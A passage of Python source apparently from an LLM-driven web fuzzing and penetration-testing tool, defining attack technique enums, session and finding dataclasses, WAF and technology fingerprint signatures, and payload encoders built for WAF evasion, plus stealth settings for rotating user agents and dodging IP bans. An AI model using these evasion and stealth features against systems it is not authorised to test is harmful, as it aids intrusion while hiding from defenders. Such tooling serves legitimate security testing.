    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSTI = "ssti"
    XXE = "xxe"
    SSRF = "ssrf"
    IDOR = "idor"
    AUTH_BYPASS = "auth_bypass"
    BUSINESS_LOGIC = "business_logic"
    API_ABUSE = "api_abuse"
    HEADER_INJECTION = "header_injection"
    PARAMETER_POLLUTION = "parameter_pollution"
    
    # Protocol-specific techniques
    GRAPHQL = "graphql"
    WEBSOCKET = "websocket"
    GRPC = "grpc"
    
    # Offensive/Red Team techniques
    C2_DETECTION = "c2_detection"
    MALWARE_ANALYSIS = "malware_analysis"
    EVASION_TESTING = "evasion_testing"
    
    # OOB/Blind techniques
    BLIND_SSRF = "blind_ssrf"
    BLIND_XXE = "blind_xxe"
    BLIND_RCE = "blind_rce"
    BLIND_SQLI = "blind_sqli"
    OOB_EXFIL = "oob_exfil"
    
    # OpenAPI/Spec-driven
    OPENAPI_FUZZING = "openapi_fuzzing"
    
    # Authentication & Authorization
    JWT_ATTACK = "jwt_attack"
    OAUTH_ATTACK = "oauth_attack"
    SAML_ATTACK = "saml_attack"
    SESSION_FIXATION = "session_fixation"
    SESSION_HIJACKING = "session_hijacking"
    CREDENTIAL_STUFFING = "credential_stuffing"
    PASSWORD_RESET = "password_reset"
    MFA_BYPASS = "mfa_bypass"
    
    # Advanced Request-Level Attacks
    HTTP_SMUGGLING = "http_smuggling"
    RACE_CONDITION = "race_condition"
    HTTP2_ATTACKS = "http2_attacks"
    REQUEST_SPLITTING = "request_splitting"
    
    # Client-Side Attacks
    PROTOTYPE_POLLUTION = "prototype_pollution"
    DOM_CLOBBERING = "dom_clobbering"
    CSS_INJECTION = "css_injection"
    DANGLING_MARKUP = "dangling_markup"
    CLICKJACKING = "clickjacking"
    POSTMESSAGE_EXPLOIT = "postmessage_exploit"
    
    # Cache & CDN Attacks
    CACHE_POISONING = "cache_poisoning"
    CACHE_DECEPTION = "cache_deception"
    CDN_BYPASS = "cdn_bypass"
    
    # Injection Variants
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"
    NOSQL_INJECTION = "nosql_injection"
    CRLF_INJECTION = "crlf_injection"
    HOST_HEADER_INJECTION = "host_header_injection"
    EMAIL_INJECTION = "email_injection"
    CSV_INJECTION = "csv_injection"
    LOG_INJECTION = "log_injection"
    
    # Configuration & Misconfiguration
    CORS_BYPASS = "cors_bypass"
    MASS_ASSIGNMENT = "mass_assignment"
    OPEN_REDIRECT = "open_redirect"
    INFORMATION_DISCLOSURE = "information_disclosure"
    DEBUG_ENDPOINTS = "debug_endpoints"
    DEFAULT_CREDENTIALS = "default_credentials"
    
    # Deserialization
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    JAVA_DESERIALIZATION = "java_deserialization"
    PHP_DESERIALIZATION = "php_deserialization"
    PYTHON_PICKLE = "python_pickle"
    DOTNET_DESERIALIZATION = "dotnet_deserialization"
    
    # File-Based Attacks
    FILE_UPLOAD = "file_upload"
    FILE_INCLUSION = "file_inclusion"
    ZIP_SLIP = "zip_slip"
    SVG_XSS = "svg_xss"
    PDF_INJECTION = "pdf_injection"
    
    # API-Specific
    BOLA = "bola"  # Broken Object Level Authorization
    BFLA = "bfla"  # Broken Function Level Authorization
    EXCESSIVE_DATA_EXPOSURE = "excessive_data_exposure"
    LACK_OF_RESOURCES = "lack_of_resources"
    MASS_ASSIGNMENT_API = "mass_assignment_api"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    
    # Cryptographic
    PADDING_ORACLE = "padding_oracle"
    WEAK_CRYPTO = "weak_crypto"
    TIMING_ATTACK = "timing_attack"
    
    # Cloud-Specific
    CLOUD_METADATA = "cloud_metadata"
    BUCKET_TAKEOVER = "bucket_takeover"
    SUBDOMAIN_TAKEOVER = "subdomain_takeover"
    
    # Server-Side
    EXPRESSION_LANGUAGE_INJECTION = "expression_language_injection"
    OGNL_INJECTION = "ognl_injection"
    SPEL_INJECTION = "spel_injection"
    
    # WordPress/CMS Specific
    WORDPRESS_EXPLOIT = "wordpress_exploit"
    DRUPAL_EXPLOIT = "drupal_exploit"
    JOOMLA_EXPLOIT = "joomla_exploit"


class WafType(str, Enum):
    """Detected WAF types."""
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AKAMAI = "akamai"
    MODSECURITY = "modsecurity"
    IMPERVA = "imperva"
    F5_BIG_IP = "f5_big_ip"
    SUCURI = "sucuri"
    UNKNOWN = "unknown"
    NONE = "none"


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class TechFingerprint:
    """Technology fingerprint detected from responses."""
    server: Optional[str] = None
    framework: Optional[str] = None
    language: Optional[str] = None
    cms: Optional[str] = None
    waf: WafType = WafType.NONE
    waf_confidence: float = 0.0
    headers_seen: Dict[str, str] = field(default_factory=dict)
    cookies: List[str] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "server": self.server,
            "framework": self.framework,
            "language": self.language,
            "cms": self.cms,
            "waf": self.waf.value,
            "waf_confidence": self.waf_confidence,
            "technologies": self.technologies,
        }


def is_valid_endpoint_url(url: str) -> bool:
    """
    Validate that a URL looks like a real endpoint, not JavaScript garbage.
    
    Filters out:
    - Code snippets that got mistakenly captured
    - URLs with JavaScript syntax in them
    - URLs that are too long (likely code fragments)
    - URLs with invalid characters for paths
    """
    if not url:
        return False
    
    # Strip query strings for validation
    path = url.split('?')[0]
    
    # Max reasonable URL length (filters out code fragments)
    if len(path) > 200:
        return False
    
    # Min reasonable length
    if len(path) < 2:
        return False
    
    # JavaScript syntax indicators - definitely not endpoints
    js_indicators = [
        '==', '!=', '===', '!==',  # Comparison operators
        '&&', '||',  # Logical operators
        '=>',  # Arrow functions
        '++', '--',  # Increment/decrement
        '+=', '-=', '*=', '/=',  # Assignment operators
        'function(', 'function (',  # Function declarations
        '.prototype', '.constructor',  # Prototypes
        'typeof ', 'instanceof ',  # Type checks
        'return ', 'throw ',  # Statements
        '.length', '.toString', '.valueOf',  # Common properties
        'undefined', 'NaN',  # Undefined/NaN
        '{}', '[]',  # Empty objects/arrays
        'module.exports', 'require(',  # Node.js
        'import ', 'export ',  # ES6 modules
        '.apply(', '.call(', '.bind(',  # Function methods
        '.push(', '.pop(', '.shift(', '.map(', '.filter(',  # Array methods
        '.getElementById', '.querySelector', '.appendChild',  # DOM
        'document.', 'window.',  # Browser globals
        'console.', 'Math.',  # Common objects
        '\\n', '\\t', '\\r',  # Escape sequences
        '/*', '*/', '//',  # Comments
    ]
    
    for indicator in js_indicators:
        if indicator in path:
            return False
    
    # Check for excessive special characters (code fragments)
    special_chars = sum(1 for c in path if c in '(){}[]<>!=&|+*;:,\\')
    if special_chars > 3:  # Allow a few for query params
        return False
    
    # Check for excessive uppercase words (camelCase vars)
    # Valid paths are usually lowercase with - or _
    uppercase_segments = re.findall(r'[A-Z][a-z]+[A-Z]', path)
    if len(uppercase_segments) > 2:
        return False
    
    # Must start with http, https, or /
    if not (url.startswith(('http://', 'https://', '/'))):
        return False
    
    # Path should only contain valid URL characters
    parsed = urllib.parse.urlparse(url)
    path_part = parsed.path
    
    # Valid path characters: alphanumeric, -, _, ., ~, /, @, !, $, &, ', (, ), *, +, ,, ;, =
    # But we're stricter to filter JS
    valid_path_pattern = r'^[a-zA-Z0-9_\-./~%@]+$'
    if not re.match(valid_path_pattern, path_part):
        # Allow some special chars but not many
        invalid_chars = re.findall(r'[^a-zA-Z0-9_\-./~%@]', path_part)
        if len(invalid_chars) > 2:
            return False
    
    return True


@dataclass
class DiscoveredEndpoint:
    """An endpoint discovered during auto-discovery."""
    url: str
    method: str = "GET"
    parameters: List[str] = field(default_factory=list)
    source: str = "html"  # html, json, javascript, api
    confidence: float = 1.0
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)
    
    @classmethod
    def create_validated(cls, url: str, method: str = "GET", parameters: List[str] = None, 
                         source: str = "html", confidence: float = 1.0) -> Optional["DiscoveredEndpoint"]:
        """Create a DiscoveredEndpoint only if the URL passes validation."""
        if not is_valid_endpoint_url(url):
            logger.debug(f"Filtered invalid endpoint URL: {url[:100]}...")
            return None
        return cls(url=url, method=method, parameters=parameters or [], source=source, confidence=confidence)


@dataclass
class BlindDetectionResult:
    """Result from blind vulnerability detection."""
    technique: str
    detected: bool
    detection_method: str  # time_based, oob_callback, dns_rebind
    baseline_time: float = 0.0
    payload_time: float = 0.0
    time_difference: float = 0.0
    callback_received: bool = False
    callback_data: Optional[str] = None
    confidence: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AttackChainStep:
    """A single step in an attack chain."""
    order: int
    technique: str
    payload: str
    expected_outcome: str
    actual_outcome: Optional[str] = None
    success: bool = False
    data_extracted: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AttackChain:
    """A multi-step attack chain."""
    id: str
    name: str
    description: str
    steps: List[AttackChainStep] = field(default_factory=list)
    current_step: int = 0
    status: str = "pending"  # pending, in_progress, success, failed
    final_impact: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "name": self.name,
            "description": self.description,
            "steps": [s.to_dict() for s in self.steps],
            "current_step": self.current_step,
            "status": self.status,
            "final_impact": self.final_impact,
        }


@dataclass
class FuzzingTarget:
    """A target endpoint for fuzzing."""
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    parameters: List[str] = field(default_factory=list)
    discovered_params: List[str] = field(default_factory=list)
    fingerprint: Optional[TechFingerprint] = None
    raw_request: str = ""  # Original raw HTTP request for reference
    
    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        if self.fingerprint:
            result["fingerprint"] = self.fingerprint.to_dict()
        return result


@dataclass
class FuzzingFinding:
    """A vulnerability finding from fuzzing."""
    id: str
    technique: str
    severity: str
    title: str
    description: str
    payload: str
    evidence: List[str]
    endpoint: str
    parameter: Optional[str] = None
    recommendation: str = ""
    confidence: float = 0.0
    exploitable: bool = False
    cvss_score: float = 0.0
    cvss_vector: str = ""
    proof_of_concept: str = ""
    remediation_priority: str = "medium"
    cwe_id: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AgenticFuzzingSession:
    """State for an agentic fuzzing session."""
    id: str
    targets: List[FuzzingTarget]
    current_phase: FuzzingPhase = FuzzingPhase.RECONNAISSANCE
    current_target_index: int = 0
    current_technique: Optional[FuzzingTechnique] = None
    techniques_tried: Dict[str, List[str]] = field(default_factory=dict)  # endpoint -> techniques
    findings: List[FuzzingFinding] = field(default_factory=list)
    iterations: int = 0
    max_iterations: int = 50
    llm_decisions: List[Dict[str, Any]] = field(default_factory=list)
    fuzzing_history: List[Dict[str, Any]] = field(default_factory=list)
    started_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    completed_at: Optional[str] = None
    status: str = "running"
    error: Optional[str] = None
    # New fields for enhanced capabilities
    discovered_endpoints: List[DiscoveredEndpoint] = field(default_factory=list)
    attack_chains: List[AttackChain] = field(default_factory=list)
    blind_detection_results: List[BlindDetectionResult] = field(default_factory=list)
    callback_token: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    baseline_response_time: float = 0.0
    auto_discovery_enabled: bool = True
    chain_attacks_enabled: bool = True
    blind_detection_enabled: bool = True
    # Robustness tracking
    retry_count: int = 0
    rate_limit_delays: float = 0.0
    circuit_breaker_trips: int = 0
    total_requests: int = 0  # Total HTTP requests made during fuzzing
    # Advanced robustness configuration
    deduplication_enabled: bool = True
    deduplication_threshold: float = 0.85
    parallel_execution_enabled: bool = False
    max_parallel_workers: int = 5
    auth_config: Optional[AuthConfig] = None
    # Deduplication stats
    duplicate_findings_skipped: int = 0
    # Parallel execution stats
    parallel_batches_executed: int = 0
    total_parallel_tasks: int = 0
    # Automation settings
    auto_pilot_mode: AutoPilotMode = AutoPilotMode.DISABLED
    auto_escalation_enabled: bool = True
    enabled_techniques: Optional[List[FuzzingTechnique]] = None
    # Scan profile settings
    scan_profile_name: Optional[str] = None  # Name of the scan profile to use
    scan_profile: Optional[Dict[str, Any]] = None  # Resolved profile configuration
    # Intelligent crawling settings
    intelligent_crawl_enabled: bool = True  # Enable by default for thorough testing
    crawl_depth: int = 3
    crawl_max_pages: int = 100
    sitemap: Optional[Dict[str, Any]] = None  # Discovered site map
    crawl_stats: Dict[str, Any] = field(default_factory=dict)
    # Memory management settings
    max_history_size: int = 500  # Maximum entries in fuzzing_history
    max_decisions_size: int = 200  # Maximum entries in llm_decisions
    history_evicted_count: int = 0  # Track evictions for stats
    decisions_evicted_count: int = 0
    # Phase 1: Scan Control Features
    max_duration_seconds: Optional[int] = None  # Timeout for entire scan (None = no timeout)
    dry_run: bool = False  # Preview mode - no actual requests
    stop_on_critical: bool = False  # Stop scan when critical finding detected
    min_severity_to_report: str = "low"  # Filter findings: critical, high, medium, low, info
    log_full_requests: bool = False  # Log full request/response for debugging
    log_full_responses: bool = False  # Log response bodies (can be large)
    scan_start_time: Optional[float] = None  # Unix timestamp when scan started
    critical_finding_detected: bool = False  # Flag for stop-on-critical
    timeout_reached: bool = False  # Flag for timeout
    requests_logged: List[Dict[str, Any]] = field(default_factory=list)  # Logged requests for debugging
    dry_run_plan: List[Dict[str, Any]] = field(default_factory=list)  # Plan generated in dry-run mode
    # Stealth Mode Settings
    stealth_mode_enabled: bool = False
    stealth_delay_min: float = 2.0  # Minimum delay between requests (seconds)
    stealth_delay_max: float = 5.0  # Maximum delay between requests (seconds)
    stealth_requests_before_pause: int = 10  # Requests before taking a longer pause
    stealth_pause_duration: float = 30.0  # Duration of pause (seconds)
    stealth_randomize_user_agent: bool = True  # Rotate User-Agent headers
    stealth_randomize_headers: bool = True  # Add random benign headers
    stealth_request_count: int = 0  # Counter for pause logic
    # IP Renewal Settings (for avoiding IP bans)
    stealth_ip_renewal_enabled: bool = False  # Enable IP renewal pauses
    stealth_ip_renewal_interval: int = 50  # Requests before IP renewal pause
    stealth_ip_renewal_count: int = 0  # Counter for IP renewal
    stealth_ip_renewal_pending: bool = False  # Flag to indicate renewal is needed
    stealth_ip_renewals_done: int = 0  # Track how many renewals have been done
    
    def _manage_memory(self):
        """Evict old entries from history lists to prevent unbounded memory growth."""
        # Manage fuzzing_history
        if len(self.fuzzing_history) > self.max_history_size:
            excess = len(self.fuzzing_history) - self.max_history_size
            self.fuzzing_history = self.fuzzing_history[excess:]
            self.history_evicted_count += excess
        
        # Manage llm_decisions
        if len(self.llm_decisions) > self.max_decisions_size:
            excess = len(self.llm_decisions) - self.max_decisions_size
            self.llm_decisions = self.llm_decisions[excess:]
            self.decisions_evicted_count += excess
        
        # Manage discovered_endpoints (keep last 1000)
        if len(self.discovered_endpoints) > 1000:
            self.discovered_endpoints = self.discovered_endpoints[-1000:]
        
        # Manage blind_detection_results (keep last 500)
        if len(self.blind_detection_results) > 500:
            self.blind_detection_results = self.blind_detection_results[-500:]
    
    def add_to_history(self, entry: Dict[str, Any]):
        """Add entry to fuzzing history with automatic memory management."""
        self.fuzzing_history.append(entry)
        self._manage_memory()
    
    def add_decision(self, decision: Dict[str, Any]):
        """Add LLM decision with automatic memory management."""
        self.llm_decisions.append(decision)
        self._manage_memory()
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "targets": [t.to_dict() for t in self.targets],
            "current_phase": self.current_phase.value,
            "current_target_index": self.current_target_index,
            "current_technique": self.current_technique.value if self.current_technique else None,
            "techniques_tried": self.techniques_tried,
            "findings": [f.to_dict() for f in self.findings],
            "iterations": self.iterations,
            "max_iterations": self.max_iterations,
            "llm_decisions": self.llm_decisions[-50:],  # Last 50 for API response
            "fuzzing_history": self.fuzzing_history[-50:],  # Last 50 for API response
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "status": self.status,
            "error": self.error,
            "discovered_endpoints": [e.to_dict() for e in self.discovered_endpoints[-100:]],  # Last 100
            "attack_chains": [c.to_dict() for c in self.attack_chains],
            "blind_detection_results": [r.to_dict() for r in self.blind_detection_results[-50:]],
            "callback_token": self.callback_token,
            "baseline_response_time": self.baseline_response_time,
            "auto_discovery_enabled": self.auto_discovery_enabled,
            "chain_attacks_enabled": self.chain_attacks_enabled,
            "blind_detection_enabled": self.blind_detection_enabled,
            # Automation stats
            "automation": {
                "auto_pilot_mode": self.auto_pilot_mode.value,
                "auto_escalation_enabled": self.auto_escalation_enabled,
                "enabled_techniques": [t.value for t in (self.enabled_techniques or [])],
                "engine_stats": _automation_engine.get_stats(),
            },
            # Robustness stats
            "robustness_stats": {
                "retry_count": self.retry_count,
                "rate_limit_delays_total": self.rate_limit_delays,
                "circuit_breaker_trips": self.circuit_breaker_trips,
                "rate_limiter": _rate_limiter.get_stats(),
                "domain_circuit_breakers": _domain_circuit_breakers.get_all_states(),
                "llm_circuit_breaker": _llm_circuit_breaker.get_state(),
                "request_deduplicator": _request_deduplicator.get_stats(),
                # Deduplication stats
                "deduplication_enabled": self.deduplication_enabled,
                "deduplication_threshold": self.deduplication_threshold,
                "duplicate_findings_skipped": self.duplicate_findings_skipped,
                "deduplicator_stats": _finding_deduplicator.get_stats(),
                # Parallel execution stats
                "parallel_execution_enabled": self.parallel_execution_enabled,
                "max_parallel_workers": self.max_parallel_workers,
                "parallel_batches_executed": self.parallel_batches_executed,
                "total_parallel_tasks": self.total_parallel_tasks,
                # Memory management stats
                "memory_management": {
                    "history_size": len(self.fuzzing_history),
                    "max_history_size": self.max_history_size,
                    "history_evicted": self.history_evicted_count,
                    "decisions_size": len(self.llm_decisions),
                    "max_decisions_size": self.max_decisions_size,
                    "decisions_evicted": self.decisions_evicted_count,
                },
                # Auth config
                "auth_configured": self.auth_config is not None and self.auth_config.auth_type != AuthType.NONE,
            },
            # Scan profile
            "scan_profile": {
                "name": self.scan_profile_name,
                "config": self.scan_profile,
            },
            # Intelligent crawling
            "crawling": {
                "enabled": self.intelligent_crawl_enabled,
                "depth": self.crawl_depth,
                "max_pages": self.crawl_max_pages,
                "sitemap_available": self.sitemap is not None,
                "stats": self.crawl_stats,
            },
            # ETA estimation
            "eta": self._get_eta_dict(),
            # Phase 1: Scan Control Features
            "scan_control": {
                "max_duration_seconds": self.max_duration_seconds,
                "dry_run": self.dry_run,
                "stop_on_critical": self.stop_on_critical,
                "min_severity_to_report": self.min_severity_to_report,
                "log_full_requests": self.log_full_requests,
                "log_full_responses": self.log_full_responses,
                "timeout_reached": self.timeout_reached,
                "critical_finding_detected": self.critical_finding_detected,
                "elapsed_seconds": self._get_elapsed_seconds(),
                "time_remaining_seconds": self._get_time_remaining(),
            },
            # Dry-run plan (only in dry-run mode)
            "dry_run_plan": self.dry_run_plan if self.dry_run else None,
            # Request logs (if enabled)
            "request_logs": self.requests_logged[-100:] if self.log_full_requests else None,
        }
    
    def _get_elapsed_seconds(self) -> Optional[float]:
        """Get elapsed time since scan started."""
        if self.scan_start_time:
            return time.time() - self.scan_start_time
        return None
    
    def _get_time_remaining(self) -> Optional[float]:
        """Get remaining time before timeout."""
        if self.max_duration_seconds and self.scan_start_time:
            elapsed = time.time() - self.scan_start_time
            remaining = self.max_duration_seconds - elapsed
            return max(0, remaining)
        return None
    
    def check_timeout(self) -> bool:
        """Check if scan has exceeded timeout."""
        if self.max_duration_seconds and self.scan_start_time:
            elapsed = time.time() - self.scan_start_time
            if elapsed >= self.max_duration_seconds:
                self.timeout_reached = True
                return True
        return False
    
    def should_report_finding(self, severity: str) -> bool:
        """Check if a finding meets the minimum severity threshold."""
        severity_order = ["info", "low", "medium", "high", "critical"]
        try:
            min_index = severity_order.index(self.min_severity_to_report.lower())
            finding_index = severity_order.index(severity.lower())
            return finding_index >= min_index
        except ValueError:
            return True  # Report if unknown severity
    
    def log_request(self, request_data: Dict[str, Any], response_data: Dict[str, Any]):
        """Log request/response if logging is enabled."""
        if self.log_full_requests or self.log_full_responses:
            log_entry = {
                "timestamp": datetime.utcnow().isoformat(),
                "iteration": self.iterations,
            }
            if self.log_full_requests:
                log_entry["request"] = request_data
            if self.log_full_responses:
                log_entry["response"] = response_data
            self.requests_logged.append(log_entry)
            # Keep only last 1000 logs to prevent memory issues
            if len(self.requests_logged) > 1000:
                self.requests_logged = self.requests_logged[-1000:]
    
    def _get_eta_dict(self) -> Optional[Dict[str, Any]]:
        """Get ETA information if available."""
        if ETA_SERVICE_AVAILABLE:
            try:
                eta = get_eta(self.id)
                if eta:
                    return eta.to_dict()
            except Exception:
                pass
        return None


# Store active sessions
_active_sessions: Dict[str, AgenticFuzzingSession] = {}


# =============================================================================
# FINDING RECORDING HELPERS (Phase 1)
# =============================================================================

def record_finding_with_controls(
    session: AgenticFuzzingSession,
    finding: FuzzingFinding,
) -> Dict[str, Any]:
    """
    Record a finding with Phase 1 scan control checks.
    
    This helper:
    - Checks minimum severity threshold
    - Detects critical findings for stop-on-critical
    - Handles deduplication
    - Logs requests if enabled
    
    Args:
        session: The fuzzing session
        finding: The finding to record
        
    Returns:
        Dict with recording result and any control flags
    """
    result = {
        "recorded": False,
        "filtered_by_severity": False,
        "is_critical": False,
        "reason": None,
    }
    
    # Check severity threshold
    if not session.should_report_finding(finding.severity):
        result["filtered_by_severity"] = True
        result["reason"] = f"Finding severity '{finding.severity}' below threshold '{session.min_severity_to_report}'"
        session.duplicate_findings_skipped += 1
        return result
    
    # Check for duplicates using global deduplicator
    if session.deduplication_enabled:
        is_dup, dup_reason = _finding_deduplicator.is_duplicate(finding)
        if is_dup:
            result["reason"] = f"Duplicate finding: {dup_reason}"
            session.duplicate_findings_skipped += 1
            return result
    
    # Add to deduplicator and session
    _finding_deduplicator.add_finding(finding)
    session.findings.append(finding)
    
    # Check for critical finding (for stop-on-critical)
    if finding.severity.lower() == "critical":
        session.critical_finding_detected = True
        result["is_critical"] = True
    
    result["recorded"] = True
    return result


# =============================================================================
# FINGERPRINTING & WAF DETECTION
# =============================================================================

WAF_SIGNATURES = {
    WafType.CLOUDFLARE: {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid", "cf-request-id"],
        "body_patterns": [r"cloudflare", r"ray id", r"error 1", r"attention required"],
        "status_patterns": {403: ["cloudflare"], 503: ["cloudflare"]},
    },
    WafType.AWS_WAF: {
        "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amzn-trace-id"],
        "body_patterns": [r"aws waf", r"request blocked", r"access denied"],
        "status_patterns": {403: ["aws", "amazon"]},
    },
    WafType.AKAMAI: {
        "headers": ["akamai-grn", "x-akamai-request-id", "x-akamai-edgescape"],
        "body_patterns": [r"akamai", r"reference #", r"access denied"],
        "status_patterns": {403: ["akamai"]},
    },
    WafType.MODSECURITY: {
        "headers": ["x-mod-security"],
        "body_patterns": [r"mod_security", r"modsecurity", r"owasp", r"rule id"],
        "status_patterns": {403: ["modsec", "mod_sec"]},
    },
    WafType.IMPERVA: {
        "headers": ["x-iinfo", "incap_ses"],
        "body_patterns": [r"incapsula", r"imperva", r"visid_incap"],
        "status_patterns": {403: ["incapsula"]},
    },
    WafType.F5_BIG_IP: {
        "headers": ["x-cnection", "bigipserver"],
        "body_patterns": [r"big-ip", r"f5", r"application security"],
        "status_patterns": {403: ["f5", "big-ip"]},
    },
    WafType.SUCURI: {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body_patterns": [r"sucuri", r"cloudproxy", r"access denied"],
        "status_patterns": {403: ["sucuri"]},
    },
}

TECH_SIGNATURES = {
    "server": {
        "nginx": ["nginx"],
        "apache": ["apache", "httpd"],
        "iis": ["microsoft-iis", "iis"],
        "express": ["express"],
        "gunicorn": ["gunicorn"],
        "uvicorn": ["uvicorn"],
        "werkzeug": ["werkzeug"],
    },
    "framework": {
        "django": ["csrftoken", "django", "drf"],
        "flask": ["werkzeug", "flask"],
        "rails": ["x-rails", "ruby on rails", "_rails_session"],
        "laravel": ["laravel_session", "x-powered-by: laravel"],
        "spring": ["jsessionid", "spring"],
        "express": ["express", "x-powered-by: express"],
        "asp.net": ["asp.net", ".aspx", "aspnet_sessionid"],
        "fastapi": ["fastapi"],
    },
    "language": {
        "php": ["x-powered-by: php", ".php", "phpsessid"],
        "java": ["jsessionid", "java", ".jsp", ".do"],
        "python": ["python", "werkzeug", "gunicorn", "uvicorn"],
        "ruby": ["ruby", "rack", "puma"],
        "node": ["node", "express", "x-powered-by: express"],
        "dotnet": [".net", "asp.net", "x-aspnet-version"],
    },
    "cms": {
        "wordpress": ["wp-content", "wp-includes", "wordpress"],
        "drupal": ["drupal", "x-drupal"],
        "joomla": ["joomla", "/administrator/"],
        "magento": ["magento", "mage"],
    },
}


def detect_waf(headers: Dict[str, str], body: str, status_code: int) -> Tuple[WafType, float]:
    """Detect WAF from response headers and body."""
    headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
    body_lower = body.lower()
    
    for waf_type, signatures in WAF_SIGNATURES.items():
        confidence = 0.0
        
        # Check headers
        for header in signatures.get("headers", []):
            if header.lower() in headers_lower:
                confidence += 0.4
        
        # Check body patterns
        for pattern in signatures.get("body_patterns", []):
            if re.search(pattern, body_lower):
                confidence += 0.3
        
        # Check status-specific patterns
        if status_code in signatures.get("status_patterns", {}):
            for pattern in signatures["status_patterns"][status_code]:
                if pattern in body_lower:
                    confidence += 0.3
        
        if confidence >= 0.5:
            return waf_type, min(confidence, 1.0)
    
    return WafType.NONE, 0.0


def fingerprint_response(headers: Dict[str, str], body: str, cookies: List[str] = None) -> TechFingerprint:
    """Fingerprint technology stack from response."""
    fingerprint = TechFingerprint()
    headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
    body_lower = body.lower()
    cookies = cookies or []
    
    # Detect server
    if "server" in headers_lower:
        server = headers_lower["server"]
        fingerprint.server = server
        for tech, patterns in TECH_SIGNATURES["server"].items():
            if any(p in server for p in patterns):
                fingerprint.technologies.append(f"server:{tech}")
    
    # Detect framework
    combined = " ".join([body_lower] + [v for v in headers_lower.values()] + cookies)
    for tech, patterns in TECH_SIGNATURES["framework"].items():
        if any(p in combined for p in patterns):
            fingerprint.framework = tech
            fingerprint.technologies.append(f"framework:{tech}")
            break
    
    # Detect language
    for tech, patterns in TECH_SIGNATURES["language"].items():
        if any(p in combined for p in patterns):
            fingerprint.language = tech
            fingerprint.technologies.append(f"language:{tech}")
            break
    
    # Detect CMS
    for tech, patterns in TECH_SIGNATURES["cms"].items():
        if any(p in combined for p in patterns):
            fingerprint.cms = tech
            fingerprint.technologies.append(f"cms:{tech}")
            break
    
    # Detect WAF
    fingerprint.waf, fingerprint.waf_confidence = detect_waf(headers, body, 200)
    fingerprint.headers_seen = dict(headers)
    fingerprint.cookies = cookies
    
    return fingerprint


# =============================================================================
# PAYLOAD ENCODING & EVASION
# =============================================================================

def encode_payload(payload: str, encoding: str) -> str:
    """Encode payload with various evasion techniques."""
    if encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    elif encoding == "hex":
        return "".join(f"%{ord(c):02x}" for c in payload)
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "html":
        return "".join(f"&#{ord(c)};" for c in payload)
    elif encoding == "mixed_case":
        return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
    elif encoding == "comment_injection":
        # Add SQL comments to evade WAF
        return "".join(c + "/**/" if c in "' \"=" else c for c in payload)
    elif encoding == "null_byte":
        return payload.replace(" ", "%00")
    elif encoding == "tab_newline":
        return payload.replace(" ", "\t").replace("=", "\n=")
    return payload


def generate_evasion_payloads(payload: str, waf_type: WafType, count: int = 10) -> List[str]:
    """
    Generate WAF evasion variants of a payload.
    
    Uses mutation engine if available for intelligent evasion,
    falls back to basic encodings otherwise.
    
    Args:
        payload: Original payload to mutate
        waf_type: Detected WAF type
        count: Maximum number of variants to generate
        
    Returns:
        List of evasion payload variants
    """
    variants = [payload]
    
    # Use mutation engine if available for intelligent evasion
    if MUTATION_ENGINE_AVAILABLE and waf_type != WafType.NONE:
        waf_name = waf_type.value if hasattr(waf_type, 'value') else str(waf_type)
        
        # Get WAF-specific mutations
        waf_mutations = generate_waf_specific_mutations(payload, waf_name)
        for mutation in waf_mutations[:count // 2]:
            if mutation["mutated"] not in variants:
                variants.append(mutation["mutated"])
        
        # Get general mutations
        general_mutations = generate_mutated_payloads(
            payload=payload,
            count=count - len(variants),
            context="url_param",
            avoid_blocked=True,
        )
        for mutation in general_mutations:
            if mutation["mutated"] not in variants:
                variants.append(mutation["mutated"])
    else:
        # Fall back to basic encodings
        encodings = ["url", "double_url", "hex", "mixed_case"]
        
        if waf_type in [WafType.MODSECURITY, WafType.AWS_WAF]:
            encodings.extend(["comment_injection", "tab_newline"])
        
        if waf_type in [WafType.CLOUDFLARE, WafType.AKAMAI]:
            encodings.extend(["unicode", "null_byte"])
        
        for encoding in encodings:
            encoded = encode_payload(payload, encoding)
            if encoded != payload and encoded not in variants:
                variants.append(encoded)
    
    return variants[:count]


def generate_advanced_evasion_payloads(
    payload: str,
    waf_type: WafType,
    context: str = "url_param",
    technique: str = None,
    count: int = 20,
) -> List[Dict[str, Any]]:
    """
    Generate advanced WAF evasion variants with metadata.
    
    Uses the mutation engine for intelligent, context-aware evasion.
    
    Args:
        payload: Original payload
        waf_type: Detected WAF type
        context: Injection context (url_param, body_param, header, etc.)
        technique: Attack technique (sqli, xss, etc.)
        count: Maximum variants to generate
        
    Returns:
        List of mutation results with metadata
    """
    results = []
    
    if not MUTATION_ENGINE_AVAILABLE:
        # Fall back to basic evasion
